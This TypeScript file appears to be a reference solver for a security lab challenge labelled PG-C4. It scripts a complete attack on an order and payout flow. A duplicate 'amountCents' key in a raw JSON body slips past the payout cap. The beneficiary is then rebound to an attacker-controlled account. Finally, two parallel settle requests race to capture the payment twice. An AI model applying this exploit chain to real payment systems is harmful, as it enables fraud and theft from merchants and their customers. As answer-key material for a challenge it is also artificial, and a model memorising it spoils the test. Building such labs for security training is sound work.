// PG-C4 reference solver: duplicate-key cap bypass -> draft rebind -> concurrent capture race.
import type { CompositeProofReceipt } from '../../../lib/types.ts'
import type { SolverContext } from './context.ts'

export async function solveC4(ctx: SolverContext): Promise<CompositeProofReceipt | null> {
  const plan = ctx.lab.plan
  const prefix = plan.routePrefix
  const member = await ctx.login('member_a')
  const inflated = plan.economics.payoutCapCents + plan.economics.orderAmountCents
  const raw = `{"amountCents":${inflated},"beneficiary":"acct_vendor_1","amountCents":100}`

  const created = await ctx.http('edge', `${prefix}/orders`, { method: 'POST', token: member, rawBody: raw })
  if (created.status !== 201) return null
  const orderId = created.json<{ order: { id: string } }>().order.id

  await ctx.http('api', `${prefix}/orders/${orderId}/settle-race`, { method: 'POST', token: member })

  const rebound = await ctx.http('api', `${prefix}/orders/${orderId}/rebind`, {
    method: 'PATCH', token: member, body: { beneficiary: 'acct_attacker_controlled' },
  })
  if (rebound.status !== 200) return null

  const [first, second] = await Promise.all([
    ctx.http('api', `${prefix}/orders/${orderId}/settle-race`, { method: 'POST', token: member }),
    ctx.http('api', `${prefix}/orders/${orderId}/settle-race`, { method: 'POST', token: member }),
  ])
  if (first.status !== 200 && second.status !== 200) return null

  return ctx.confirm('PG-C4')
}
